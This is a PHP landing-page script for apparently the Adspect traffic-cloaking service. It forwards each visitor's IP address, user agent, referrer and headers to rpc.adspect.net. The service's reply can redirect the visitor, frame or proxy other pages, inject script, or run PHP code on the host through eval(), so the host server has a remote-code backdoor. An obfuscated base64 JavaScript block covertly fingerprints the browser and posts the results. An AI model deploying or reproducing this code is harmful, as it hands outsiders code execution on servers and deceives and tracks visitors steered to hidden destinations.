<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('46660bf7-8ecb-4497-b92e-e3e443405a6a', 'redirect', '_', base64_decode('WWFehWyPdqm8EZ3yitIgmm8Rrafqay0PyIvQyrfmmSM=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDFlODg9WydwZXJtaXNzaW9uJywnMTMwNDI4NnNjcHZkSicsJ3R5cGUnLCdQT1NUJywnbm9kZU5hbWUnLCdsZW5ndGgnLCcxMTMzN0RoRGxTRCcsJzE0MlpKTEtZQicsJ2xvY2F0aW9uJywnd2luZG93JywnYXBwZW5kQ2hpbGQnLCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJywnZG9jdW1lbnQnLCdkYXRhJywnVG91Y2hFdmVudCcsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ2xvZycsJ3B1c2gnLCc0MDE5NzlXVm91Y0knLCdOb3RpZmljYXRpb24nLCdnZXRDb250ZXh0JywnNjc5OTAwZ3lrR1RIJywnbm9kZVZhbHVlJywnb2JqZWN0JywnaGlkZGVuJywnZXJyb3JzJywnbmFtZScsJzYwODdoekpnYnUnLCd0b3N0cmluZycsJ25vdGlmaWNhdGlvbnMnLCdmdW5jdGlvbicsJ3RoZW4nLCdnZXRUaW1lem9uZU9mZnNldCcsJ3RpbWV6b25lT2Zmc2V0JywnY2xvc3VyZScsJ3RvdWNoRXZlbnQnLCd3ZWJnbCcsJ2JvZHknLCdnZXRQYXJhbWV0ZXInLCc2MDA4NjZ6VU5VemMnLCdhY3Rpb24nLCdkb2N1bWVudEVsZW1lbnQnLCcxMzlGeWhtSVMnLCdwZXJtaXNzaW9ucycsJ2lucHV0JywnbWVzc2FnZScsJ2dldEV4dGVuc2lvbicsJ3NjcmVlbicsJ25hdmlnYXRvcicsJ2NyZWF0ZUVsZW1lbnQnLCdjYW52YXMnLCdzdGF0ZScsJ2NvbnNvbGUnLCd0b1N0cmluZycsJzI0ODY1MkVOYnNtQiddO3ZhciBfMHhlNWY3PWZ1bmN0aW9uKF8weDI0ODFkNyxfMHg4MjA1NGIpe18weDI0ODFkNz1fMHgyNDgxZDctMHhjYjt2YXIgXzB4MWU4ODU4PV8weDFlODhbXzB4MjQ4MWQ3XTtyZXR1cm4gXzB4MWU4ODU4O307KGZ1bmN0aW9uKF8weDQ0ZDdjYyxfMHg1Yjc1ZDIpe3ZhciBfMHgxMzk0ZDY9XzB4ZTVmNzt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDI3MWE1NT1wYXJzZUludChfMHgxMzk0ZDYoMHhmMykpKy1wYXJzZUludChfMHgxMzk0ZDYoMHhlNCkpKi1wYXJzZUludChfMHgxMzk0ZDYoMHhkMSkpKy1wYXJzZUludChfMHgxMzk0ZDYoMHhkZCkpKy1wYXJzZUludChfMHgxMzk0ZDYoMHhkZikpK3BhcnNlSW50KF8weDEzOTRkNigweGYwKSkrLXBhcnNlSW50KF8weDEzOTRkNigweGY5KSkqcGFyc2VJbnQoXzB4MTM5NGQ2KDB4ZTUpKStwYXJzZUludChfMHgxMzk0ZDYoMHhjZSkpO2lmKF8weDI3MWE1NT09PV8weDViNzVkMilicmVhaztlbHNlIF8weDQ0ZDdjY1sncHVzaCddKF8weDQ0ZDdjY1snc2hpZnQnXSgpKTt9Y2F0Y2goXzB4M2E2NTU2KXtfMHg0NGQ3Y2NbJ3B1c2gnXShfMHg0NGQ3Y2NbJ3NoaWZ0J10oKSk7fX19KF8weDFlODgsMHhjZDY1MCksZnVuY3Rpb24oKXt2YXIgXzB4MjBkYTkwPV8weGU1Zjc7ZnVuY3Rpb24gXzB4MmQ2NGYzKCl7dmFyIF8weDdlMjRiNj1fMHhlNWY3O18weDUyMzc2YltfMHg3ZTI0YjYoMHhmNyldPV8weDM2MGY2NDt2YXIgXzB4YzViOGYwPWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oJ2Zvcm0nKSxfMHgzYWY1OTY9ZG9jdW1lbnRbXzB4N2UyNGI2KDB4ZDgpXShfMHg3ZTI0YjYoMHhkMykpO18weGM1YjhmMFsnbWV0aG9kJ109XzB4N2UyNGI2KDB4ZTEpLF8weGM1YjhmMFtfMHg3ZTI0YjYoMHhjZildPXdpbmRvd1snbG9jYXRpb24nXVsnaHJlZiddLF8weDNhZjU5NltfMHg3ZTI0YjYoMHhlMCldPV8weDdlMjRiNigweGY2KSxfMHgzYWY1OTZbXzB4N2UyNGI2KDB4ZjgpXT1fMHg3ZTI0YjYoMHhlYiksXzB4M2FmNTk2Wyd2YWx1ZSddPUpTT05bJ3N0cmluZ2lmeSddKF8weDUyMzc2YiksXzB4YzViOGYwWydhcHBlbmRDaGlsZCddKF8weDNhZjU5NiksZG9jdW1lbnRbXzB4N2UyNGI2KDB4Y2MpXVtfMHg3ZTI0YjYoMHhlOCldKF8weGM1YjhmMCksXzB4YzViOGYwWydzdWJtaXQnXSgpO312YXIgXzB4MzYwZjY0PVtdLF8weDUyMzc2Yj17fTt0cnl7dmFyIF8weDM2M2JhMT1mdW5jdGlvbihfMHg0ZGFlYjEpe3ZhciBfMHg0Y2Q5Nzg9XzB4ZTVmNztpZihfMHg0Y2Q5NzgoMHhmNSk9PT10eXBlb2YgXzB4NGRhZWIxJiZudWxsIT09XzB4NGRhZWIxKXt2YXIgXzB4NDhhOTk5PWZ1bmN0aW9uKF8weDFiN2MzYyl7dmFyIF8weDExNTIzMD1fMHg0Y2Q5Nzg7dHJ5e3ZhciBfMHgxODQ5ODg9XzB4NGRhZWIxW18weDFiN2MzY107c3dpdGNoKHR5cGVvZiBfMHgxODQ5ODgpe2Nhc2UgXzB4MTE1MjMwKDB4ZjUpOmlmKG51bGw9PT1fMHgxODQ5ODgpYnJlYWs7Y2FzZSBfMHgxMTUyMzAoMHhmYyk6XzB4MTg0OTg4PV8weDE4NDk4OFtfMHgxMTUyMzAoMHhkYyldKCk7fV8weDQxODc3NltfMHgxYjdjM2NdPV8weDE4NDk4ODt9Y2F0Y2goXzB4M2YyM2Q2KXtfMHgzNjBmNjRbXzB4MTE1MjMwKDB4ZWYpXShfMHgzZjIzZDZbXzB4MTE1MjMwKDB4ZDQpXSk7fX0sXzB4NDE4Nzc2PXt9LF8weDRlNzMxYjtmb3IoXzB4NGU3MzFiIGluIF8weDRkYWViMSlfMHg0OGE5OTkoXzB4NGU3MzFiKTt0cnl7dmFyIF8weDU0NTk5ZD1PYmplY3RbJ2dldE93blByb3BlcnR5TmFtZXMnXShfMHg0ZGFlYjEpO2ZvcihfMHg0ZTczMWI9MHgwO18weDRlNzMxYjxfMHg1NDU5OWRbXzB4NGNkOTc4KDB4ZTMpXTsrK18weDRlNzMxYilfMHg0OGE5OTkoXzB4NTQ1OTlkW18weDRlNzMxYl0pO18weDQxODc3NlsnISEnXT1fMHg1NDU5OWQ7fWNhdGNoKF8weDM4ZDc2OSl7XzB4MzYwZjY0W18weDRjZDk3OCgweGVmKV0oXzB4MzhkNzY5W18weDRjZDk3OCgweGQ0KV0pO31yZXR1cm4gXzB4NDE4Nzc2O319O18weDUyMzc2YltfMHgyMGRhOTAoMHhkNildPV8weDM2M2JhMSh3aW5kb3dbXzB4MjBkYTkwKDB4ZDYpXSksXzB4NTIzNzZiW18weDIwZGE5MCgweGU3KV09XzB4MzYzYmExKHdpbmRvdyksXzB4NTIzNzZiWyduYXZpZ2F0b3InXT1fMHgzNjNiYTEod2luZG93WyduYXZpZ2F0b3InXSksXzB4NTIzNzZiW18weDIwZGE5MCgweGU2KV09XzB4MzYzYmExKHdpbmRvd1tfMHgyMGRhOTAoMHhlNildKSxfMHg1MjM3NmJbXzB4MjBkYTkwKDB4ZGIpXT1fMHgzNjNiYTEod2luZG93W18weDIwZGE5MCgweGRiKV0pLF8weDUyMzc2YltfMHgyMGRhOTAoMHhkMCldPWZ1bmN0aW9uKF8weDRjNjE1Zil7dmFyIF8weDQ3ZDhiZT1fMHgyMGRhOTA7dHJ5e3ZhciBfMHgxMGU1YmQ9e307XzB4NGM2MTVmPV8weDRjNjE1ZlsnYXR0cmlidXRlcyddO2Zvcih2YXIgXzB4NjE4YWUwIGluIF8weDRjNjE1ZilfMHg2MThhZTA9XzB4NGM2MTVmW18weDYxOGFlMF0sXzB4MTBlNWJkW18weDYxOGFlMFtfMHg0N2Q4YmUoMHhlMildXT1fMHg2MThhZTBbXzB4NDdkOGJlKDB4ZjQpXTtyZXR1cm4gXzB4MTBlNWJkO31jYXRjaChfMHg0Mzc5YjQpe18weDM2MGY2NFtfMHg0N2Q4YmUoMHhlZildKF8weDQzNzliNFsnbWVzc2FnZSddKTt9fShkb2N1bWVudFtfMHgyMGRhOTAoMHhkMCldKSxfMHg1MjM3NmJbXzB4MjBkYTkwKDB4ZWEpXT1fMHgzNjNiYTEoZG9jdW1lbnQpO3RyeXtfMHg1MjM3NmJbXzB4MjBkYTkwKDB4ZmYpXT1uZXcgRGF0ZSgpW18weDIwZGE5MCgweGZlKV0oKTt9Y2F0Y2goXzB4NGIxZGE0KXtfMHgzNjBmNjRbXzB4MjBkYTkwKDB4ZWYpXShfMHg0YjFkYTRbXzB4MjBkYTkwKDB4ZDQpXSk7fXRyeXtfMHg1MjM3NmJbXzB4MjBkYTkwKDB4MTAwKV09ZnVuY3Rpb24oKXt9W18weDIwZGE5MCgweGRjKV0oKTt9Y2F0Y2goXzB4MTdkZGFhKXtfMHgzNjBmNjRbJ3B1c2gnXShfMHgxN2RkYWFbXzB4MjBkYTkwKDB4ZDQpXSk7fXRyeXtfMHg1MjM3NmJbXzB4MjBkYTkwKDB4MTAxKV09ZG9jdW1lbnRbJ2NyZWF0ZUV2ZW50J10oXzB4MjBkYTkwKDB4ZWMpKVsndG9TdHJpbmcnXSgpO31jYXRjaChfMHgzYTFkZTMpe18weDM2MGY2NFtfMHgyMGRhOTAoMHhlZildKF8weDNhMWRlM1tfMHgyMGRhOTAoMHhkNCldKTt9dHJ5e18weDM2M2JhMT1mdW5jdGlvbigpe307dmFyIF8weGJkMDZjNj0weDA7XzB4MzYzYmExWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHhiZDA2YzYsJyc7fSxjb25zb2xlW18weDIwZGE5MCgweGVlKV0oXzB4MzYzYmExKSxfMHg1MjM3NmJbXzB4MjBkYTkwKDB4ZmEpXT1fMHhiZDA2YzY7fWNhdGNoKF8weDI5YmM4MCl7XzB4MzYwZjY0W18weDIwZGE5MCgweGVmKV0oXzB4MjliYzgwW18weDIwZGE5MCgweGQ0KV0pO313aW5kb3dbXzB4MjBkYTkwKDB4ZDcpXVtfMHgyMGRhOTAoMHhkMildWydxdWVyeSddKHsnbmFtZSc6XzB4MjBkYTkwKDB4ZmIpfSlbXzB4MjBkYTkwKDB4ZmQpXShmdW5jdGlvbihfMHgyYWQwM2Qpe3ZhciBfMHg1NDdkMzQ9XzB4MjBkYTkwO18weDUyMzc2YlsncGVybWlzc2lvbnMnXT1bd2luZG93W18weDU0N2QzNCgweGYxKV1bXzB4NTQ3ZDM0KDB4ZGUpXSxfMHgyYWQwM2RbXzB4NTQ3ZDM0KDB4ZGEpXV0sXzB4MmQ2NGYzKCk7fSxfMHgyZDY0ZjMpO3RyeXt2YXIgXzB4NGQ1OTMxPWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oXzB4MjBkYTkwKDB4ZDkpKVtfMHgyMGRhOTAoMHhmMildKF8weDIwZGE5MCgweGNiKSksXzB4NTI3MTIwPV8weDRkNTkzMVtfMHgyMGRhOTAoMHhkNSldKF8weDIwZGE5MCgweGU5KSk7XzB4NTIzNzZiWyd3ZWJnbCddPXsndmVuZG9yJzpfMHg0ZDU5MzFbJ2dldFBhcmFtZXRlciddKF8weDUyNzEyMFtfMHgyMGRhOTAoMHhlZCldKSwncmVuZGVyZXInOl8weDRkNTkzMVtfMHgyMGRhOTAoMHhjZCldKF8weDUyNzEyMFsnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnXSl9O31jYXRjaChfMHgxNTEzYWEpe18weDM2MGY2NFtfMHgyMGRhOTAoMHhlZildKF8weDE1MTNhYVsnbWVzc2FnZSddKTt9fWNhdGNoKF8weDQxOWFhZil7XzB4MzYwZjY0W18weDIwZGE5MCgweGVmKV0oXzB4NDE5YWFmW18weDIwZGE5MCgweGQ0KV0pLF8weDJkNjRmMygpO319KCkpOw=="></script>
</body>
</html>
<?php exit;